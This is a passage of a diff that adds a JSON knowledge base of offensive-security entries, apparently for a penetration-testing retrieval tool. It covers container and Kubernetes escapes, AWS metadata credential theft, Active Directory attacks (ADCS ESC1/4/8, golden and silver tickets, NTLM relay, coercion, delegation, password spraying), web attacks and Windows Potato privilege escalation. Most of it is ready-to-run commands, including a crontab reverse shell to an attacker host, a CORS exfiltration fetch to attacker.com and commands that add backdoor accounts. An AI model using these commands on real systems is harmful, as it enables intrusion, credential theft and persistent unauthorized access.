+    "content": "Docker container escape techniques\nCheck if inside container: cat /.dockerenv  OR  ls /.dockerenv (file exists in containers)\nCheck privileges: cat /proc/self/status | grep CapEff (all f's = fully privileged)\nPrivileged container escape:\n  fdisk -l  (list host disks)\n  mkdir /mnt/host; mount /dev/sda1 /mnt/host\n  chroot /mnt/host /bin/bash  \u2192  full host filesystem\nDocker socket escape (if /var/run/docker.sock mounted):\n  ls -la /var/run/docker.sock  (if accessible \u2192 full Docker API access)\n  docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh\n  (starts new privileged container with host filesystem mounted)\nCgroup escape (privileged, release_agent technique):\n  Check: cat /proc/1/cgroup | grep docker\n  Use: https://github.com/stealthcopter/deepce\nTool: deepce.sh (comprehensive container escape checker)",
+    "metadata": {
+      "category": "privesc",
+      "technique": "container-escape",
+      "tool": "docker"
+    }
+  },
+  {
+    "id": "cloud-aws-metadata",
+    "content": "Cloud: AWS metadata credential theft (IMDSv1)\nRequires: SSRF or shell access inside an EC2 instance\nCheck if IMDSv1 (unauthenticated) is enabled:\n  curl http://169.254.169.254/latest/meta-data/\nGet IAM role name:\n  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\nGet temporary credentials:\n  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>\n  Returns: AccessKeyId, SecretAccessKey, Token\nUse stolen credentials:\n  export AWS_ACCESS_KEY_ID=<key>\n  export AWS_SECRET_ACCESS_KEY=<secret>\n  export AWS_SESSION_TOKEN=<token>\n  aws sts get-caller-identity  (verify who you are)\n  aws s3 ls  /  aws iam list-users  /  aws ec2 describe-instances\nIMDSv2 (token required): curl -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds:21600' http://169.254.169.254/latest/api/token",
+    "metadata": {
+      "category": "cloud",
+      "technique": "metadata-ssrf",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "enum-smtp",
+    "content": "SMTP enumeration and exploitation\nBanner grab: nc <host> 25\nUser enumeration (VRFY/EXPN/RCPT TO):\n  smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <host>\n  smtp-user-enum -M RCPT -U users.txt -D example.com -t <host>\nOpen relay test (can spam without auth):\n  telnet <host> 25\n  EHLO test\n  MAIL FROM: attacker@evil.com\n  RCPT TO: victim@victim.com  (if accepted \u2192 open relay)\nNmap scripts:\n  nmap --script smtp-enum-users,smtp-open-relay -p 25 <host>\nSendmail log disclosure: try VRFY root, VRFY nobody\nSwaks (send test emails): swaks --to victim@example.com --from spoof@example.com --server <host>",
+    "metadata": {
+      "category": "recon",
+      "technique": "enumeration",
+      "service": "smtp",
+      "port": "25"
+    }
+  },
+  {
+    "id": "enum-nfs",
+    "content": "NFS enumeration\nList exports from attacker:\n  showmount -e <host>\n  nmap --script nfs-showmount -p 111,2049 <host>\nMount share:\n  mkdir /mnt/nfs; mount -t nfs <host>:/share /mnt/nfs\n  mount -o vers=3 <host>:/share /mnt/nfs  (force NFSv3 if v4 fails)\nList files including hidden:\n  ls -la /mnt/nfs\nCheck for world-readable sensitive files: .ssh/, .bash_history, config files\nUID manipulation (if no_root_squash): create user with matching UID on attacker\n  useradd -u 1001 targetuser\n  su targetuser; ls -la /mnt/nfs  (now accessing as that UID)",
+    "metadata": {
+      "category": "recon",
+      "technique": "enumeration",
+      "service": "nfs",
+      "port": "2049"
+    }
+  },
+  {
+    "id": "enum-ldap",
+    "content": "LDAP enumeration (often open on domain controllers port 389/636)\nAnonymous bind test:\n  ldapsearch -x -H ldap://<host> -b '' -s base '(objectClass=*)'\nDump everything (anonymous):\n  ldapsearch -x -H ldap://<host> -b 'dc=example,dc=com'\nWith credentials:\n  ldapsearch -x -H ldap://<host> -D 'user@example.com' -w 'Password' -b 'dc=example,dc=com'\nEnumerate users:\n  ldapsearch -x -H ldap://<host> -b 'dc=example,dc=com' '(objectClass=user)' sAMAccountName userPrincipalName\nEnumerate groups:\n  ldapsearch -x -H ldap://<host> -b 'dc=example,dc=com' '(objectClass=group)' cn member\nFind admins:\n  ldapsearch -x -H ldap://<host> -b 'CN=Domain Admins,CN=Users,dc=example,dc=com'\nTool: ldapdomaindump (outputs HTML/JSON): ldapdomaindump -u 'domain\\user' -p pass <host>",
+    "metadata": {
+      "category": "recon",
+      "technique": "enumeration",
+      "service": "ldap",
+      "port": "389"
+    }
+  },
+  {
+    "id": "ad-adcs-esc1",
+    "content": "ADCS ESC1: Enroll in a certificate template with SAN (SubjectAltName) that allows client auth\nDetection:\n  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable\n  OR: Certify.exe find /vulnerable (Windows)\nExploit:\n  certipy req -u <user>@<domain> -p <pass> -ca <CA-name> -template <template> -upn administrator@<domain>\n  certipy auth -pfx administrator.pfx -dc-ip <dc>\nResult: TGT as Administrator. Then use pass-the-ticket or secretsdump.\nESC1 condition: template allows enrollee-supplied SAN + msPKI-Certificate-Name-Flag has ENROLLEE_SUPPLIES_SUBJECT",
+    "metadata": {
+      "category": "ad",
+      "technique": "adcs",
+      "tool": "certipy"
+    }
+  },
+  {
+    "id": "ad-adcs-esc4-esc8",
+    "content": "ADCS ESC4/ESC8: Template write access / Web enrollment NTLM relay\nESC4 \u2014 write dacl on template allows modifying it to become ESC1:\n  certipy template -u <user>@<domain> -p <pass> -template <vuln_template> -save-old\n  (modify template to allow SAN, then exploit as ESC1)\nESC8 \u2014 NTLM relay to HTTP-based AD CS enrollment endpoint:\n  ntlmrelayx.py -t http://<ca-server>/certsrv/mscep/mscep.dll --adcs --template DomainController\n  Trigger coerce (PetitPotam, PrinterBug) from DC \u2192 relay to CA\n  certipy auth -pfx dc.pfx -dc-ip <dc>\nResult: Domain compromise via DC certificate",
+    "metadata": {
+      "category": "ad",
+      "technique": "adcs",
+      "tool": "certipy"
+    }
+  },
+  {
+    "id": "ad-golden-ticket",
+    "content": "Golden Ticket: Forge TGT using krbtgt hash (full domain persistence)\nRequires: krbtgt NTLM hash (from DCSync), domain SID\nGet domain SID: Get-ADDomain | select DomainSID  (or from secretsdump output)\nImpacket:\n  ticketer.py -nthash <krbtgt-hash> -domain-sid <S-1-5-21-...> -domain <domain> administrator\n  export KRB5CCNAME=administrator.ccache\n  secretsdump.py -k -no-pass <dc-fqdn>\nMimikatz:\n  kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /krbtgt:<hash> /ptt\nResult: Persistent domain admin access. Valid for 10 years by default.\nNote: Changing krbtgt password twice invalidates all golden tickets",
+    "metadata": {
+      "category": "ad",
+      "technique": "kerberos",
+      "tool": "mimikatz"
+    }
+  },
+  {
+    "id": "ad-silver-ticket",
+    "content": "Silver Ticket: Forge TGS for a specific service using service account hash\nRequires: Service account NTLM hash, domain SID, target SPN\nAdvantage: No communication with DC \u2014 harder to detect than golden ticket\nMimikatz:\n  kerberos::golden /user:Administrator /domain:<domain> /sid:<SID>\n    /target:<host> /service:cifs /rc4:<service-hash> /ptt\nImpacket:\n  ticketer.py -nthash <service-hash> -domain-sid <SID> -domain <domain>\n    -spn cifs/<target-fqdn> administrator\nCommon services: cifs (file shares), http (IIS), mssql, host, rpcss, wsman\nResult: Authenticated access to that service as any user",
+    "metadata": {
+      "category": "ad",
+      "technique": "kerberos",
+      "tool": "mimikatz"
+    }
+  },
+  {
+    "id": "ad-ntlm-relay",
+    "content": "NTLM Relay Attack: Relay captured NTLM auth to another host\nSetup:\n  1. Disable SMB signing check: crackmapexec smb <subnet>/24 --gen-relay-list targets.txt\n  2. Start relay: ntlmrelayx.py -tf targets.txt -smb2support\n  3. Poison LLMNR/NBT-NS: responder -I eth0 -A  (Analysis mode; turn off SMB/HTTP in Responder.conf)\n     OR coerce with: PetitPotam.py <attacker> <dc> (unauthenticated on unpatched DC)\n     OR: printerbug.py <domain>/<user>:<pass>@<dc> <attacker>\nInteractive shell: ntlmrelayx.py -tf targets.txt -smb2support -i\n  Then nc 127.0.0.1 11000\nExecute command: ntlmrelayx.py -tf targets.txt -smb2support -c 'net user hacker P@ss123 /add /domain'\nLDAP relay (for adding user to DA): ntlmrelayx.py -t ldap://<dc> --escalate-user <controlled-user>",
+    "metadata": {
+      "category": "ad",
+      "technique": "relay",
+      "tool": "ntlmrelayx"
+    }
+  },
+  {
+    "id": "ad-coercion-techniques",
+    "content": "Authentication Coercion: Force a machine to authenticate to attacker\nPetitPotam (unauthenticated on unpatched): PetitPotam.py <attacker-ip> <dc-ip>\nPrinterBug (SpoolSS): printerbug.py <domain>/<user>:<pass>@<dc> <attacker-ip>\nDFSCoerce: dfscoerce.py -u <user> -p <pass> <attacker-ip> <dc>\nCoercer (all methods): coercer coerce -l <attacker-ip> -t <target> -u <user> -p <pass>\nUse cases:\n  - Relay machine account auth to LDAP \u2192 add user to DA group\n  - Relay DC auth to ADCS \u2192 get DC cert \u2192 DCSync\n  - Capture NTLMv2 hash for cracking",
+    "metadata": {
+      "category": "ad",
+      "technique": "coercion",
+      "tool": "petitpotam"
+    }
+  },
+  {
+    "id": "web-cors-misconfiguration",
+    "content": "CORS Misconfiguration: Steal cross-origin data via reflected Origin header\nTest: curl -H 'Origin: https://evil.com' -I https://<target>/api/user\nCheck response for: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true\nVulnerable patterns:\n  - Origin reflected verbatim\n  - null Origin accepted: curl -H 'Origin: null' ...\n  - Regex bypass: target.evil.com if regex checks endsWith('target.com')\nExploit (requires victim to visit attacker page while authenticated):\n  fetch('https://<target>/api/secret', {credentials:'include'})\n    .then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+btoa(d)))\nImpact: Steal session tokens, API keys, PII from authenticated endpoints",
+    "metadata": {
+      "category": "web",
+      "technique": "cors",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "web-graphql-attacks",
+    "content": "GraphQL Attack Techniques\nIntrospection (find all types/queries):\n  {__schema{types{name,fields{name,args{name,type{name}}}}}}\n  Tool: graphql-voyager for visual schema exploration\nBatch query abuse (rate limit bypass):\n  [{query:'mutation{login(u:\"a\",p:\"1\")}'},{query:'mutation{login(u:\"a\",p:\"2\")}'},...]\nIntrospection disabled? Try field suggestions and __type queries\nIDOR via direct object reference: {user(id:2){email,password_hash}}\nSQL/NoSQL injection in arguments: {user(id:\"1 OR 1=1\"){...}}\nTool: graphw00f (fingerprint), clairvoyance (wordlist-based field discovery)\nDisable introspection bypass: use __schema{queryType{name}} as minimal probe",
+    "metadata": {
+      "category": "web",
+      "technique": "graphql",
+      "tool": "graphql"
+    }
+  },
+  {
+    "id": "web-oauth-attacks",
+    "content": "OAuth 2.0 Attack Techniques\nOpen redirect \u2192 token theft:\n  If redirect_uri is validated by prefix only:\n  ?redirect_uri=https://legit.com.evil.com/callback\n  OR: ?redirect_uri=https://legit.com/../../callback\nCSRF on OAuth callback: state param missing or predictable \u2192 steal code\nToken leakage via Referer: authorization code in URL logged in server logs\nImplicit flow token theft: fragment (#access_token=...) leaks in Referer\nScope escalation: modify scope param to request admin:write instead of read\nClickjacking on authorize endpoint: iframe the consent page to trick clicks\nJWT algorithm confusion (if using RS256 signed JWTs): switch to HS256 with public key\nCheck for: missing state param, weak redirect_uri validation, token in URL",
+    "metadata": {
+      "category": "web",
+      "technique": "oauth",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "kubernetes-escape",
+    "content": "Kubernetes Escape Techniques\nCheck if in a pod: cat /proc/1/cgroup | grep -i kube; ls /.dockerenv\nService account token: cat /var/run/secrets/kubernetes.io/serviceaccount/token\nQuery API server:\n  KUBE_HOST=$(cat /var/run/secrets/kubernetes.io/serviceaccount/..namespace)\n  curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\"\nPrivileged pod \u2192 node escape:\n  mount /dev/sda1 /mnt; chroot /mnt  (if privileged + disk visible)\n  nsenter --target 1 --mount --uts --ipc --net --pid -- bash\nCreate pod with hostPath for node escape:\n  kubectl apply -f evil-pod.yaml  (mount host / in pod)\nTools: kubeaudit, kube-hunter, deepce (auto-detect escape vectors)",
+    "metadata": {
+      "category": "cloud",
+      "technique": "k8s-escape",
+      "tool": "kubectl"
+    }
+  },
+  {
+    "id": "docker-privileged-escape",
+    "content": "Docker Privileged Container Escape\nVerify privileged: cat /proc/self/status | grep CapEff (should be ffffffffffffffff)\nMethod 1 \u2014 mount host disk:\n  fdisk -l; mkdir /mnt/host; mount /dev/sda1 /mnt/host\n  chroot /mnt/host  \u2192 host root shell\n  OR: echo '* * * * * root /bin/bash -i >& /dev/tcp/<attacker>/4444 0>&1' >> /mnt/host/etc/crontab\nMethod 2 \u2014 cgroup v1 release_agent:\n  mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp\n  mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release\n  host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n  echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n  echo '#!/bin/sh\\nid > /output' > /cmd; chmod +x /cmd\n  sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'\nMethod 3 \u2014 writable /var/run/docker.sock inside container:\n  docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host",
+    "metadata": {
+      "category": "cloud",
+      "technique": "docker-escape",
+      "tool": "docker"
+    }
+  },
+  {
+    "id": "osint-passive-recon-workflow",
+    "content": "Passive OSINT systematic workflow (no direct target contact)\n1. DNS & certificates:\n   subfinder -d <domain> -all -o subs.txt\n   amass enum -passive -d <domain> -o amass.txt\n   curl 'https://crt.sh/?q=%25.<domain>&output=json' | jq '.[].name_value' | sort -u\n2. ASN & IP ranges:\n   whois -h whois.radb.net -- '-i origin AS<num>' | grep route\n   bgp.he.net \u2192 search org name \u2192 get ASN \u2192 get prefixes\n3. Shodan / Censys:\n   shodan search 'org:\"<Company Name>\"' --fields ip_str,port,hostnames\n   censys search 'autonomous_system.name: <org>' --index hosts\n4. Google dorks:\n   site:<domain> filetype:pdf | xls | doc\n   site:<domain> inurl:admin | login | portal\n   \"<company>\" password filetype:txt site:pastebin.com\n5. Email harvesting: hunter.io, theHarvester -d <domain> -b all\n6. Breach data: haveibeenpwned API, dehashed.com",
+    "metadata": {
+      "category": "osint",
+      "technique": "passive-recon",
+      "tool": "subfinder"
+    }
+  },
+  {
+    "id": "osint-github-secrets",
+    "content": "GitHub Secret Hunting\nSearch GitHub for leaked credentials:\n  github.com/search?q=<company>+password&type=code\n  github.com/search?q=<domain>+api_key\n  github.com/search?q=<domain>+secret\nTools:\n  trufflehog git https://github.com/<org>/<repo> --only-verified\n  gitleaks detect --source /path/to/repo\n  gitrob (scans org repos for secrets)\nSearch in commit history (after cloning):\n  git log -p | grep -i 'password\\|secret\\|api_key\\|token'\n  git log --all --oneline | xargs git show\nExposed .git directory on web:\n  curl http://<target>/.git/config  (if accessible)\n  git-dumper http://<target>/.git /tmp/repo  (dump entire repo)",
+    "metadata": {
+      "category": "osint",
+      "technique": "github-recon",
+      "tool": "trufflehog"
+    }
+  },
+  {
+    "id": "windows-token-impersonation",
+    "content": "Windows Token Impersonation (beyond SeImpersonatePrivilege)\nCheck tokens: whoami /priv\nSeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege \u2192 Potato attacks\nPrintSpoofer (Windows 10 / Server 2019):\n  PrintSpoofer.exe -i -c cmd  (local SYSTEM shell)\nRoguePotato / SweetPotato:\n  RoguePotato.exe -r <attacker-ip> -e 'cmd.exe /c net user hacker P@ss /add'\nGodPotato (works on 2012-2022):\n  GodPotato.exe -cmd 'cmd /c whoami'\nJuicyPotato (older systems, Server 2016 and earlier):\n  JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}\n  CLSIDs: https://github.com/ohpe/juicy-potato/tree/master/CLSID",
+    "metadata": {
+      "category": "privesc",
+      "technique": "token-impersonation",
+      "tool": "godpotato"
+    }
+  },
+  {
+    "id": "ad-kerberos-delegation",
+    "content": "Kerberos Delegation Attacks\nFind unconstrained delegation hosts (except DCs):\n  Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation\n  BloodHound: node query MATCH (n:Computer {unconstraineddelegation:true}) RETURN n\nUnconstrained delegation exploit:\n  1. Compromise the delegation host\n  2. Wait for / coerce a privileged user to authenticate to it\n  3. rubeus.exe monitor /interval:5 /nowrap  (capture TGT)\n  4. rubeus.exe ptt /ticket:<base64>  (pass the ticket)\nConstrained delegation (S4U2Proxy):\n  rubeus.exe s4u /user:<svc-user> /rc4:<hash> /impersonateuser:administrator /msdsspn:<SPN> /ptt\nResource-based constrained delegation (RBCD):\n  If write permission on target computer object:\n  Set-ADComputer <target> -PrincipalsAllowedToDelegateToAccount <controlled-computer>\n  Then S4U to impersonate domain admin on target",
+    "metadata": {
+      "category": "ad",
+      "technique": "delegation",
+      "tool": "rubeus"
+    }
+  },
+  {
+    "id": "recon-web-fingerprint",
+    "content": "Web Technology Fingerprinting\nwhatweb <target>  (CMS, framework, server detection)\nwappalyzer CLI: wappalyzer <url> (browser extension also works)\nResponse headers: curl -I <target> (check Server, X-Powered-By, X-Generator)\nCMS detection:\n  WordPress: /wp-admin, /wp-content, /wp-json/wp/v2/users (user enum)\n  Drupal: /CHANGELOG.txt, /INSTALL.txt, /sites/default/\n  Joomla: /administrator, /components/, /modules/\nWAF detection: wafw00f <target>\nHTTP methods: curl -X OPTIONS <target> -I (check Allow header)\nJS framework fingerprint: check page source for React, Angular, Vue signatures\nrobots.txt and sitemap.xml often reveal hidden paths",
+    "metadata": {
+      "category": "recon",
+      "technique": "fingerprint",
+      "tool": "whatweb"
+    }
+  },
+  {
+    "id": "ad-password-spraying",
+    "content": "AD Password Spraying (avoid lockout: 1 attempt per 30 min)\nCheck lockout policy first:\n  crackmapexec smb <dc> -u <user> -p <pass> --pass-pol\n  net accounts /domain (from Windows)\nSpray with common passwords:\n  crackmapexec smb <dc> -u users.txt -p 'Winter2024!' --continue-on-success\n  kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Spring2024'\n  sprayhound (respects lockout threshold automatically)\nGet user list (no creds needed for LDAP enumeration):\n  crackmapexec smb <dc> -u '' -p '' --users 2>/dev/null\n  kerbrute userenum -d <domain> --dc <dc> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\nCommon password patterns: Company123!, Season+Year!, Company@Year",
+    "metadata": {
+      "category": "ad",
+      "technique": "password-spray",
+      "tool": "crackmapexec"
+    }
+  }
+]
